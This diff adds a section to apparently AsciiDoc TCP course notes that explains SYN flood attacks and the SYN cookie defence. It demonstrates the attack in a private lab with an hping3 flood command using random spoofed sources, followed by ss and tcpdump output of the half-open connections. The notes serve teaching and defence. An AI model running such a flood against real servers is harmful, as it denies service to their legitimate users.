@@ -1337,6 +1337,92 @@ x@node-0:~$ sudo tcpdump -tttSnvv port 6666 -i ens32
     192.168.91.137.49598 > 192.168.91.128.6666: Flags [S], cksum 0xc0b5 (correct), seq 2744338131, win 64240, options [mss 1460,sackOK,TS val 1666722423 ecr 0,nop,wscale 7], length 0
 ----
 
+== TCP SYN flood DoS attack
+
+A *SYN flood* is a TCP DoS attack whereby one or more malicious clients generate a series of TCP connection attempts (SYN segments) and send them at a server, often with a _spoofed_ (e.g., random) source IP address.
+
+* The server allocates some amount of connection resources to each partial connection.
+* Because the connections are never established, the server may start to deny service to future legitimate requests because its memory is exhausted holding state for many half-open connections.
+
+One mechanism invented to deal with the _SYN flood_ issue is called *SYN cookies* [RFC4987].
+
+* The main insight with SYN cookies is that most of the information that would be stored for a connection when a SYN arrives could be encoded inside the _Sequence Number_ field supplied with the SYN + ACK.
+
+* The target machine using SYN cookies need not allocate any storage for the incoming connection request—it allocates real memory only once the SYN + ACK segment has itself been acknowledged (and the initial sequence number is returned).
+
+* In that case, all the vital connection parameters can be recovered and the connection can be placed in the ESTABLISHED state.
+
+* Producing SYN cookies involves a careful selection process of the TCP ISN at servers.
++
+Essentially, the server must encode any essential state in the _Sequence Number_ field in its SYN + ACK that is returned in the _ACK Number_ field from a legitimate client.
+
+[source,console]
+----
+x@node-0:~$ socat TCP-LISTEN:6666,fork,reuseaddr,backlog=16 -
+----
+
+[source,console]
+----
+x@node-1:~$ sudo hping3 -c 15000 -d 120 -S -w 64 -p 6666 --flood --rand-source 192.168.91.128
+HPING 192.168.91.128 (ens32 192.168.91.128): S set, 40 headers + 120 data bytes
+hping in flood mode, no replies will be shown
+----
+
+[source,console]
+----
+Every 2.0s: ss -ntlao src *:6666                          node-0: Tue Jan 17 14:18:42 2023
+
+State    Recv-Q Send-Q  Local Address:Port    Peer Address:Port Process
+LISTEN   0      16            0.0.0.0:6666         0.0.0.0:*
+SYN-RECV 0      0      192.168.91.128:6666 253.207.178.242:1263  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666   242.132.73.92:28552 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666    242.40.25.25:28464 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666  253.106.78.160:28362 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666   242.51.222.66:1282  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666   241.54.238.19:1223  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666    0.208.65.129:1372  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666  241.21.223.166:1369  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666  248.70.213.239:28376 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666 246.188.115.108:1231  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666  246.200.132.48:1203  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666    242.200.4.84:28562 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666    0.132.205.12:1237  timer:(on,7.796ms,4)
+SYN-RECV 0      0      192.168.91.128:6666   241.78.102.97:28296 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666 241.224.178.160:28432 timer:(on,964ms,1)
+SYN-RECV 0      0      192.168.91.128:6666  242.241.15.118:28422 timer:(on,964ms,1)
+----
+
+[source,console]
+----
+x@node-0:~$ sudo tcpdump -ntv -i ens32 port 6666 and tcp
+IP (tos 0x0, ttl 64, id 63705, offset 0, flags [none], proto TCP (6), length 160)
+    0.196.178.163.2330 > 192.168.91.128.6666: Flags [S], cksum 0x213b (correct), seq 724690304:724690424, win 64, length 120
+IP (tos 0x0, ttl 64, id 31179, offset 0, flags [none], proto TCP (6), length 160)
+    52.38.211.34.2331 > 192.168.91.128.6666: Flags [S], cksum 0xe51b (correct), seq 1259551603:1259551723, win 64, length 120
+IP (tos 0x0, ttl 64, id 1348, offset 0, flags [none], proto TCP (6), length 160)
+    163.253.38.99.2332 > 192.168.91.128.6666: Flags [S], cksum 0x8b80 (correct), seq 1145231226:1145231346, win 64, length 120
+IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 44)
+    192.168.91.128.6666 > 0.196.178.163.2330: Flags [S.], cksum 0xcfae (incorrect -> 0x5bce), seq 2338239121, ack 724690305, win 64240, options [mss 1460], length 0
+IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 44)
+    192.168.91.128.6666 > 52.38.211.34.2331: Flags [S.], cksum 0x2390 (incorrect -> 0xa7f0), seq 1462620393, ack 1259551604, win 64240, options [mss 1460], length 0
+IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 44)
+    192.168.91.128.6666 > 163.253.38.99.2332: Flags [S.], cksum 0xe6a7 (incorrect -> 0x44c3), seq 4096016080, ack 1145231227, win 64240, options [mss 1460], length 0
+IP (tos 0x0, ttl 64, id 12576, offset 0, flags [none], proto TCP (6), length 160)
+    33.27.153.163.2333 > 192.168.91.128.6666: Flags [S], cksum 0xa99c (correct), seq 547114778:547114898, win 64, length 120
+IP (tos 0x0, ttl 64, id 54784, offset 0, flags [none], proto TCP (6), length 160)
+    113.116.167.181.2334 > 192.168.91.128.6666: Flags [S], cksum 0x7af2 (correct), seq 1087648591:1087648711, win 64, length 120
+IP (tos 0x0, ttl 64, id 56408, offset 0, flags [none], proto TCP (6), length 160)
+    244.134.115.210.2335 > 192.168.91.128.6666: Flags [S], cksum 0xa0e4 (correct), seq 2011424089:2011424209, win 64, length 120
+IP (tos 0x0, ttl 64, id 11115, offset 0, flags [none], proto TCP (6), length 160)
+    79.107.129.40.2336 > 192.168.91.128.6666: Flags [S], cksum 0x3d4b (correct), seq 234582353:234582473, win 64, length 120
+IP (tos 0x0, ttl 64, id 35935, offset 0, flags [none], proto TCP (6), length 160)
+    164.52.15.173.2337 > 192.168.91.128.6666: Flags [S], cksum 0x7000 (correct), seq 1320724685:1320724805, win 64, length 120
+IP (tos 0x0, ttl 128, id 45741, offset 0, flags [none], proto TCP (6), length 40)
+    52.38.211.34.2331 > 192.168.91.128.6666: Flags [R], cksum 0x62c3 (correct), seq 1259551604, win 32767, length 0
+IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 44)
+    192.168.91.128.6666 > 33.27.153.163.2333: Flags [S.], cksum 0xd705 (incorrect -> 0x10d7), seq 1459145616, ack 547114779, win 64240, options [mss 1460], length 0
+----
+
 [bibliography]
 == References
 
